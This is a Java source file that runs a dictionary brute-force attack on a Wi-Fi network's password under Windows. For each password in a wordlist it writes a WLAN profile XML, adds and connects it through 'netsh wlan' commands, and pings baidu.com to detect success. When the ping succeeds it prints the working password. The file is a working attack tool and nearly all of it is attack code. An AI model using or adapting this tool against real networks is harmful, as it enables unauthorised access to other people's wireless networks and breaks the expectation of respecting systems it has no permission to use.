package app;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

import config.Command;
import config.Profile;
import util.FileUtils;

public class Dictionary {
	public static void main(String[] args) {
//		connect();

		String ssid = "666";
		FileReader fileReader = null;
		BufferedReader bufferedReader = null;
		try {
			fileReader = new FileReader(Connector.resource + "/" + Connector.dictionary);
			bufferedReader = new BufferedReader(fileReader);
			String lineStr = null;
//			long count = bufferedReader.lines().count();
			while ((lineStr = bufferedReader.readLine()) != null) {
				System.out.println(lineStr);
				boolean connect = connect(ssid, lineStr);
				if (connect) {
					break;
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void connect() {
		String ssid = "ss";
		String password = "ss";
		String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, ssid);
		profileContent = profileContent.replace(Profile.WIFI_PASSWORD, password);
		FileUtils.writeToFile(Connector.resource + "\\" + ssid + ".xml", profileContent);

		String xml = Connector.resource + "\\" + ssid + ".xml";
		String cmd = "netsh wlan add profile filename=" + xml;
		System.out.println(cmd);
		try {
			Process process = Runtime.getRuntime().exec(cmd, null, new File(Connector.resource));
			BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
			String line = null;
			while ((line = bReader.readLine()) != null) {
				System.out.println(line);
			}

			String connectcmd = Command.CONNECT.replace("SSID_NAME", ssid);
			System.out.println(connectcmd);
			Process connectProcess = Runtime.getRuntime().exec(connectcmd, null, new File(Connector.resource));
			BufferedReader bReader2 = new BufferedReader(new InputStreamReader(connectProcess.getInputStream(), "gbk"));
			String line2 = null;
			while ((line2 = bReader2.readLine()) != null) {
				System.out.println(line2);
			}
			Thread.sleep(100);

			String pcmd = "ping www.baidu.com";// + Connector.PING_DOMAIN;
			Process pProcess = Runtime.getRuntime().exec(pcmd);
			BufferedReader pbReader = new BufferedReader(new InputStreamReader(pProcess.getInputStream(), "gbk"));
			String pline = null;
			while ((pline = pbReader.readLine()) != null) {
				if (pline.contains("来自")) {
					System.out.println(pline + ",password:" + password);
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

	}

	public static boolean connect(String ssid, String password) {
//		String ssid = "OpenWrt";
//		String password = "123321123";
		String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, ssid);
		profileContent = profileContent.replace(Profile.WIFI_PASSWORD, password);
		FileUtils.writeToFile(Connector.resource + "\\" + ssid + ".xml", profileContent);

		String xml = Connector.resource + "\\" + ssid + ".xml";
		String cmd = "netsh wlan add profile filename=" + xml;
		System.out.println(cmd);
		try {
			Process process = Runtime.getRuntime().exec(cmd, null, new File(Connector.resource));
			BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
			String line = null;
			while ((line = bReader.readLine()) != null) {
				System.out.println(line);
			}

			String connectcmd = Command.CONNECT.replace("SSID_NAME", ssid);
			System.out.println(connectcmd);
			Process connectProcess = Runtime.getRuntime().exec(connectcmd, null, new File(Connector.resource));
			BufferedReader bReader2 = new BufferedReader(new InputStreamReader(connectProcess.getInputStream(), "gbk"));
			String line2 = null;
			while ((line2 = bReader2.readLine()) != null) {
				System.out.println(line2);
			}
			Thread.sleep(100);

			String pcmd = "ping www.baidu.com";// + Connector.PING_DOMAIN;
			Process pProcess = Runtime.getRuntime().exec(pcmd);
			BufferedReader pbReader = new BufferedReader(new InputStreamReader(pProcess.getInputStream(), "gbk"));
			String pline = null;
			while ((pline = pbReader.readLine()) != null) {
				if (pline.contains("来自")) {
					System.out.println(pline + ",password:" + password);
					return true;
				} else {
					return false;
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		return false;

	}
}
